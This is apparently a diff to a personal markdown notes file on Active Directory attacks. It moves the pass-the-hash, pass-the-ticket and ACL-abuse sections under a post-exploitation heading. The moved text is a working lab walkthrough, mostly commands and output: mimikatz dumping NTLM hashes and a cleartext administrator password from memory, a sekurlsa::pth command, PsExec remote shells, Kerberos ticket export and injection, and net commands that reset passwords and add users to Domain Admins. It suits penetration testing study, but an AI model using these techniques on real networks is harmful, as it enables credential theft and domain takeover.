@@ -1,5 +1,6 @@
 This is a collection of notes about active directory and (post)exploitation
 
+
 - [USEFULL TOOLS](#usefull-tools)
 - [Enumeration](#enumeration)
   * [Active Directory Enumeration](#active-directory-enumeration)
@@ -27,11 +28,6 @@ This is a collection of notes about active directory and (post)exploitation
   * [Bloodhound](#bloodhound)
 - [Exploitation](#exploitation)
   * [SMB Relay Attack](#smb-relay-attack)
-  * [Pass the Hash](#pass-the-hash)
-  * [Pass the Ticket](#pass-the-ticket)
-  * [Abusing ACL](#abusing-acl)
-    + [GenericALL-User](#genericall-user)
-    + [GenericALL-Group](#genericall-group)
   * [ms17_010_eternalblue](#ms17-010-eternalblue)
     + [smb_ms17_010](#smb-ms17-010)
   * [AS-REP Roasting](#as-rep-roasting)
@@ -48,6 +44,11 @@ This is a collection of notes about active directory and (post)exploitation
     + [smbexec](#smbexec)
     + [psexec](#psexec)
 - [Post-Exploitation](#post-exploitation)
+  * [Pass the Hash](#pass-the-hash)
+  * [Pass the Ticket](#pass-the-ticket)
+  * [Abusing ACL](#abusing-acl)
+    + [GenericALL-User](#genericall-user)
+    + [GenericALL-Group](#genericall-group)
   * [Golden Ticket](#golden-ticket)
   * [Machine Domain admin-Use machine NTLM hash](#machine-domain-admin-use-machine-ntlm-hash)
   * [Credential Collection](#credential-collection)
@@ -648,292 +649,6 @@ ntlmrelayx shell
 	[*] Stopping service RemoteRegistry
 
 
-
-## Pass the Hash
-
-open mimikatz on Admin or SYSTEM privilege. Get password and hash from memory
-
-	mimikatz # privilege::debug
-	Privilege '20' OK
-
-	mimikatz # sekurlsa::logonpasswords
-
-	Authentication Id : 0 ; 2524343 (00000000:002684b7)
-	Session           : CachedInteractive from 1
-	User Name         : Administrator
-	Domain            : VALHALLA
-	Logon Server      : ODIN
-	Logon Time        : 8/21/2021 7:16:03 PM
-	SID               : S-1-5-21-3410397846-649609989-2919355437-500
-			msv :
-			 [00010000] CredentialKeys
-			 * NTLM     : c718f548c75062ada93250db208d3178
-			 * SHA1     : b27655136bebed1e53ded6cb9f837c450e7bb524
-			 [00000003] Primary
-			 * Username : Administrator
-			 * Domain   : VALHALLA
-			 * NTLM     : c718f548c75062ada93250db208d3178
-			 * SHA1     : b27655136bebed1e53ded6cb9f837c450e7bb524
-			tspkg :
-			wdigest :
-			 * Username : Administrator
-			 * Domain   : VALHALLA
-			 * Password : (null)
-			kerberos :
-			 * Username : Administrator
-			 * Domain   : VALHALLA.LOCAL
-			 * Password : Pass123!
-			ssp :
-			credman :
-
-
-use captured hash and spawn a cmd
-
-
-
-	mimikatz # sekurlsa::pth /user:administrator /domain:valhalla.local /ntlm:c718f548c75062ada93250db208d3178
-	user    : administrator
-	domain  : valhalla.local
-	program : cmd.exe
-	impers. : no
-	NTLM    : c718f548c75062ada93250db208d3178
-	  |  PID  5992
-	  |  TID  5732
-	  |  LSA Process is now R/W
-	  |  LUID 0 ; 2566096 (00000000:002727d0)
-	  \_ msv1_0   - data copy @ 0000028A14C33E00 : OK !
-	  \_ kerberos - data copy @ 0000028A14C99C98
-	   \_ aes256_hmac       -> null
-	   \_ aes128_hmac       -> null
-	   \_ rc4_hmac_nt       OK
-	   \_ rc4_hmac_old      OK
-	   \_ rc4_md4           OK
-	   \_ rc4_hmac_nt_exp   OK
-	   \_ rc4_hmac_old_exp  OK
-	   \_ *Password replace @ 0000028A14D670E8 (24) -> null
-
-
-check for your privilege
-
-
-	C:\Windows\system32>dir \\odin\C$
-	 Volume in drive \\odin\C$ has no label.
-	 Volume Serial Number is 3C56-D664
-
-	 Directory of \\odin\C$
-
-	08/22/2013  06:52 PM    <DIR>          PerfLogs
-	08/13/2021  07:37 AM    <DIR>          Program Files
-	08/22/2013  06:39 PM    <DIR>          Program Files (x86)
-	08/13/2021  07:06 AM    <DIR>          Users
-	08/14/2021  12:07 AM    <DIR>          Windows
-				   0 File(s)              0 bytes
-				   5 Dir(s)  54,546,784,256 bytes free
-
-
-we are still in local machine
-
-	C:\Windows\system32>hostname
-	loki
-
-if we want a remote shell we can use psexec.exe
-
-
-	C:\Windows\system32>cd C:\Users\mrblack\Desktop\PSTools
-
-	C:\Users\mrblack\Desktop\PSTools>PsExec.exe \\odin cmd.exe
-
-	PsExec v2.34 - Execute processes remotely
-	Copyright (C) 2001-2021 Mark Russinovich
-	Sysinternals - www.sysinternals.com
-	Microsoft Windows [Version 6.3.9600](c) 2013 Microsoft Corporation. All rights reserved.
-
-	C:\Windows\system32>whoami
-	valhalla\administrator
-
-	C:\Windows\system32>hostname
-	odin
-
-	C:\Windows\system32>ipconfig
-
-	Windows IP Configuration
-
-
-	Ethernet adapter Ethernet0:
-
-	   Connection-specific DNS Suffix  . :
-	   Link-local IPv6 Address . . . . . : fe80::d130:77d8:36c:afe%12
-	   IPv4 Address. . . . . . . . . . . : 192.168.200.100
-	   Subnet Mask . . . . . . . . . . . : 255.255.255.0
-	   Default Gateway . . . . . . . . . :
-
-	Tunnel adapter isatap.{82B0F91C-D6B0-48AA-935A-1CCE190951A5}:
-
-	   Media State . . . . . . . . . . . : Media disconnected
-	   Connection-specific DNS Suffix  . :
-
-
-## Pass the Ticket
-
-firstly administrator should RDP to remote host so TGT will be stored inside memory
-
-Check for Ticket Granting Ticket inside memory
-
-	sekurlsa::tickets
-	
-
-![image](https://user-images.githubusercontent.com/13157446/130322640-4a7ede43-c670-4c46-8495-ac120415c3e2.png)
-
-	
-Export tickets
-
-	Sekurlsa::tickets /export
-
-
-inject TGT the memory and open cmd
-
-![image](https://user-images.githubusercontent.com/13157446/130322674-610de4dc-5998-4fd1-ab96-d3807741f8b5.png)
-
-
-
-check current tickets
-
-![image](https://user-images.githubusercontent.com/13157446/130322696-6d6da2c7-0982-4650-994a-f2bed7f6fc94.png)
-
-
-check you access
-
-	dir \\odin\c$\
-
-
-![image](https://user-images.githubusercontent.com/13157446/130322707-c5e5d93c-cf17-46f7-9b08-a675ec60a83d.png)
-
-
-## Abusing ACL
-
-### GenericALL-User
-
-We will check bloodhound and user has GenericAll rights for another user
-
-![image](https://user-images.githubusercontent.com/13157446/129450372-671b8874-0d30-48fd-8163-8c003cc7fdb2.png)
-
-dontmindme user can change iwouldmind users password without knowing prior password
-
-![image](https://user-images.githubusercontent.com/13157446/129450621-c28f34d9-8f4a-4bc8-8c18-efb44e977cb9.png)
-
-Fail with another user
-
-	PS C:\Users\testuser\Desktop\sharphound> whoami
-	valhalla\testuser
-	PS C:\Users\testuser\Desktop\sharphound> net user iwouldmind NewPass123! /domain
-	İstek, valhalla.local etki alanının denetleyicisinde işlenecek.
-
-	5 sistem hatası oldu.
-
-	Erişim engellendi.
-
-	PS C:\Users\testuser\Desktop\sharphound>
-
-
-### GenericALL-Group
-
-Groups for dontmindme user 
-
-	PS C:\Users\testuser\Desktop\sharphound> net user dontmindme /domain
-	İstek, valhalla.local etki alanının denetleyicisinde işlenecek.
-
-	Kullanıcı adı                         dontmindme
-	Tam ad                                dontmindme
-	Açıklama
-	Kullanıcı açıklaması
-	Ülke kodu                             000 (Sistem Varsayılan değer)
-	Hesap etkin                           Evet
-	Hesap zaman aşımı                     Asla
-
-	Parolanın son ayarlanmadı             14.08.2021 17:59:27
-	Parola süre sonu                      Asla
-	Değişebilir parola                    15.08.2021 17:59:27
-	Parola gerekli                        Evet
-	Kullanıcı parolayı değiştirebilir     Evet
-
-	İzin verilen iş istasyonları          Tümü
-	Oturum açma kodu
-	Kullanıcı profili
-	Ana dizin
-	Son oturum açma                       14.08.2021 18:03:51
-
-	İzin verilen oturum açma saatleri     Tümü
-
-	Yerel Grup Üyeliği
-	Genel Grup üyeliği                    *Domain Users
-	Komut başarıyla tamamlandı.
-
-Groups for iwouldmind user
-
-	PS C:\Users\testuser\Desktop\sharphound> net user iwouldmind /domain
-	İstek, valhalla.local etki alanının denetleyicisinde işlenecek.
-
-	Kullanıcı adı                         iwouldmind
-	Tam ad                                iwouldmind
-	Açıklama
-	Kullanıcı açıklaması
-	Ülke kodu                             000 (Sistem Varsayılan değer)
-	Hesap etkin                           Evet
-	Hesap zaman aşımı                     Asla
-
-	Parolanın son ayarlanmadı             14.08.2021 18:04:09
-	Parola süre sonu                      Asla
-	Değişebilir parola                    15.08.2021 18:04:09
-	Parola gerekli                        Evet
-	Kullanıcı parolayı değiştirebilir     Evet
-
-	İzin verilen iş istasyonları          Tümü
-	Oturum açma kodu
-	Kullanıcı profili
-	Ana dizin
-	Son oturum açma                       Asla
-
-	İzin verilen oturum açma saatleri     Tümü
-
-	Yerel Grup Üyeliği
-	Genel Grup üyeliği                    *Domain Users
-	Komut başarıyla tamamlandı.
-
-
-We will check bloodhound and user has GenericAll rights for group
-
-![image](https://user-images.githubusercontent.com/13157446/129450825-b5431b47-a3ce-4b2d-99c4-148090b4b631.png)
-
-dontmindme user can add any user to this group
-
-	PS C:\Users\testuser\Desktop\sharphound> net group "Domain Admins" /domain
-	İstek, valhalla.local etki alanının denetleyicisinde işlenecek.
-
-	Grup adı     Domain Admins
-	Açıklama     Designated administrators of the domain
-
-	Üyeler
-
-	-------------------------------------------------------------------------------
-	Administrator            THOR$
-	Komut başarıyla tamamlandı.
-
-	PS C:\Users\testuser\Desktop\sharphound>
-
-Try to add with different user
-
-	PS C:\Users\testuser\Desktop\sharphound> net group "Domain Admins" iwouldmind /add /domain
-	İstek, valhalla.local etki alanının denetleyicisinde işlenecek.
-
-	5 sistem hatası oldu.
-
-	Erişim engellendi.
-
-try to add with idontmind user
-
-![image](https://user-images.githubusercontent.com/13157446/129451269-4c579420-0e72-47be-b612-1081a906bd9c.png)
-
-
 ## ms17_010_eternalblue
 
 ### smb_ms17_010
@@ -1225,6 +940,294 @@ Crack with hashcat
 
 
 # Post-Exploitation
+
+
+## Pass the Hash
+
+open mimikatz on Admin or SYSTEM privilege. Get password and hash from memory
+
+	mimikatz # privilege::debug
+	Privilege '20' OK
+
+	mimikatz # sekurlsa::logonpasswords
+
+	Authentication Id : 0 ; 2524343 (00000000:002684b7)
+	Session           : CachedInteractive from 1
+	User Name         : Administrator
+	Domain            : VALHALLA
+	Logon Server      : ODIN
+	Logon Time        : 8/21/2021 7:16:03 PM
+	SID               : S-1-5-21-3410397846-649609989-2919355437-500
+			msv :
+			 [00010000] CredentialKeys
+			 * NTLM     : c718f548c75062ada93250db208d3178
+			 * SHA1     : b27655136bebed1e53ded6cb9f837c450e7bb524
+			 [00000003] Primary
+			 * Username : Administrator
+			 * Domain   : VALHALLA
+			 * NTLM     : c718f548c75062ada93250db208d3178
+			 * SHA1     : b27655136bebed1e53ded6cb9f837c450e7bb524
+			tspkg :
+			wdigest :
+			 * Username : Administrator
+			 * Domain   : VALHALLA
+			 * Password : (null)
+			kerberos :
+			 * Username : Administrator
+			 * Domain   : VALHALLA.LOCAL
+			 * Password : Pass123!
+			ssp :
+			credman :
+
+
+use captured hash and spawn a cmd
+
+
+
+	mimikatz # sekurlsa::pth /user:administrator /domain:valhalla.local /ntlm:c718f548c75062ada93250db208d3178
+	user    : administrator
+	domain  : valhalla.local
+	program : cmd.exe
+	impers. : no
+	NTLM    : c718f548c75062ada93250db208d3178
+	  |  PID  5992
+	  |  TID  5732
+	  |  LSA Process is now R/W
+	  |  LUID 0 ; 2566096 (00000000:002727d0)
+	  \_ msv1_0   - data copy @ 0000028A14C33E00 : OK !
+	  \_ kerberos - data copy @ 0000028A14C99C98
+	   \_ aes256_hmac       -> null
+	   \_ aes128_hmac       -> null
+	   \_ rc4_hmac_nt       OK
+	   \_ rc4_hmac_old      OK
+	   \_ rc4_md4           OK
+	   \_ rc4_hmac_nt_exp   OK
+	   \_ rc4_hmac_old_exp  OK
+	   \_ *Password replace @ 0000028A14D670E8 (24) -> null
+
+
+check for your privilege
+
+
+	C:\Windows\system32>dir \\odin\C$
+	 Volume in drive \\odin\C$ has no label.
+	 Volume Serial Number is 3C56-D664
+
+	 Directory of \\odin\C$
+
+	08/22/2013  06:52 PM    <DIR>          PerfLogs
+	08/13/2021  07:37 AM    <DIR>          Program Files
+	08/22/2013  06:39 PM    <DIR>          Program Files (x86)
+	08/13/2021  07:06 AM    <DIR>          Users
+	08/14/2021  12:07 AM    <DIR>          Windows
+				   0 File(s)              0 bytes
+				   5 Dir(s)  54,546,784,256 bytes free
+
+
+we are still in local machine
+
+	C:\Windows\system32>hostname
+	loki
+
+if we want a remote shell we can use psexec.exe
+
+
+	C:\Windows\system32>cd C:\Users\mrblack\Desktop\PSTools
+
+	C:\Users\mrblack\Desktop\PSTools>PsExec.exe \\odin cmd.exe
+
+	PsExec v2.34 - Execute processes remotely
+	Copyright (C) 2001-2021 Mark Russinovich
+	Sysinternals - www.sysinternals.com
+	Microsoft Windows [Version 6.3.9600](c) 2013 Microsoft Corporation. All rights reserved.
+
+	C:\Windows\system32>whoami
+	valhalla\administrator
+
+	C:\Windows\system32>hostname
+	odin
+
+	C:\Windows\system32>ipconfig
+
+	Windows IP Configuration
+
+
+	Ethernet adapter Ethernet0:
+
+	   Connection-specific DNS Suffix  . :
+	   Link-local IPv6 Address . . . . . : fe80::d130:77d8:36c:afe%12
+	   IPv4 Address. . . . . . . . . . . : 192.168.200.100
+	   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+	   Default Gateway . . . . . . . . . :
+
+	Tunnel adapter isatap.{82B0F91C-D6B0-48AA-935A-1CCE190951A5}:
+
+	   Media State . . . . . . . . . . . : Media disconnected
+	   Connection-specific DNS Suffix  . :
+
+
+## Pass the Ticket
+
+firstly administrator should RDP to remote host so TGT will be stored inside memory
+
+Check for Ticket Granting Ticket inside memory
+
+	sekurlsa::tickets
+	
+
+![image](https://user-images.githubusercontent.com/13157446/130322640-4a7ede43-c670-4c46-8495-ac120415c3e2.png)
+
+	
+Export tickets
+
+	Sekurlsa::tickets /export
+
+
+inject TGT the memory and open cmd
+
+![image](https://user-images.githubusercontent.com/13157446/130322674-610de4dc-5998-4fd1-ab96-d3807741f8b5.png)
+
+
+
+check current tickets
+
+![image](https://user-images.githubusercontent.com/13157446/130322696-6d6da2c7-0982-4650-994a-f2bed7f6fc94.png)
+
+
+check you access
+
+	dir \\odin\c$\
+
+
+![image](https://user-images.githubusercontent.com/13157446/130322707-c5e5d93c-cf17-46f7-9b08-a675ec60a83d.png)
+
+
+## Abusing ACL
+
+### GenericALL-User
+
+We will check bloodhound and user has GenericAll rights for another user
+
+![image](https://user-images.githubusercontent.com/13157446/129450372-671b8874-0d30-48fd-8163-8c003cc7fdb2.png)
+
+dontmindme user can change iwouldmind users password without knowing prior password
+
+![image](https://user-images.githubusercontent.com/13157446/129450621-c28f34d9-8f4a-4bc8-8c18-efb44e977cb9.png)
+
+Fail with another user
+
+	PS C:\Users\testuser\Desktop\sharphound> whoami
+	valhalla\testuser
+	PS C:\Users\testuser\Desktop\sharphound> net user iwouldmind NewPass123! /domain
+	İstek, valhalla.local etki alanının denetleyicisinde işlenecek.
+
+	5 sistem hatası oldu.
+
+	Erişim engellendi.
+
+	PS C:\Users\testuser\Desktop\sharphound>
+
+
+### GenericALL-Group
+
+Groups for dontmindme user 
+
+	PS C:\Users\testuser\Desktop\sharphound> net user dontmindme /domain
+	İstek, valhalla.local etki alanının denetleyicisinde işlenecek.
+
+	Kullanıcı adı                         dontmindme
+	Tam ad                                dontmindme
+	Açıklama
+	Kullanıcı açıklaması
+	Ülke kodu                             000 (Sistem Varsayılan değer)
+	Hesap etkin                           Evet
+	Hesap zaman aşımı                     Asla
+
+	Parolanın son ayarlanmadı             14.08.2021 17:59:27
+	Parola süre sonu                      Asla
+	Değişebilir parola                    15.08.2021 17:59:27
+	Parola gerekli                        Evet
+	Kullanıcı parolayı değiştirebilir     Evet
+
+	İzin verilen iş istasyonları          Tümü
+	Oturum açma kodu
+	Kullanıcı profili
+	Ana dizin
+	Son oturum açma                       14.08.2021 18:03:51
+
+	İzin verilen oturum açma saatleri     Tümü
+
+	Yerel Grup Üyeliği
+	Genel Grup üyeliği                    *Domain Users
+	Komut başarıyla tamamlandı.
+
+Groups for iwouldmind user
+
+	PS C:\Users\testuser\Desktop\sharphound> net user iwouldmind /domain
+	İstek, valhalla.local etki alanının denetleyicisinde işlenecek.
+
+	Kullanıcı adı                         iwouldmind
+	Tam ad                                iwouldmind
+	Açıklama
+	Kullanıcı açıklaması
+	Ülke kodu                             000 (Sistem Varsayılan değer)
+	Hesap etkin                           Evet
+	Hesap zaman aşımı                     Asla
+
+	Parolanın son ayarlanmadı             14.08.2021 18:04:09
+	Parola süre sonu                      Asla
+	Değişebilir parola                    15.08.2021 18:04:09
+	Parola gerekli                        Evet
+	Kullanıcı parolayı değiştirebilir     Evet
+
+	İzin verilen iş istasyonları          Tümü
+	Oturum açma kodu
+	Kullanıcı profili
+	Ana dizin
+	Son oturum açma                       Asla
+
+	İzin verilen oturum açma saatleri     Tümü
+
+	Yerel Grup Üyeliği
+	Genel Grup üyeliği                    *Domain Users
+	Komut başarıyla tamamlandı.
+
+
+We will check bloodhound and user has GenericAll rights for group
+
+![image](https://user-images.githubusercontent.com/13157446/129450825-b5431b47-a3ce-4b2d-99c4-148090b4b631.png)
+
+dontmindme user can add any user to this group
+
+	PS C:\Users\testuser\Desktop\sharphound> net group "Domain Admins" /domain
+	İstek, valhalla.local etki alanının denetleyicisinde işlenecek.
+
+	Grup adı     Domain Admins
+	Açıklama     Designated administrators of the domain
+
+	Üyeler
+
+	-------------------------------------------------------------------------------
+	Administrator            THOR$
+	Komut başarıyla tamamlandı.
+
+	PS C:\Users\testuser\Desktop\sharphound>
+
+Try to add with different user
+
+	PS C:\Users\testuser\Desktop\sharphound> net group "Domain Admins" iwouldmind /add /domain
+	İstek, valhalla.local etki alanının denetleyicisinde işlenecek.
+
+	5 sistem hatası oldu.
+
+	Erişim engellendi.
+
+try to add with idontmind user
+
+![image](https://user-images.githubusercontent.com/13157446/129451269-4c579420-0e72-47be-b612-1081a906bd9c.png)
+
+
+
 
 ## Golden Ticket
 
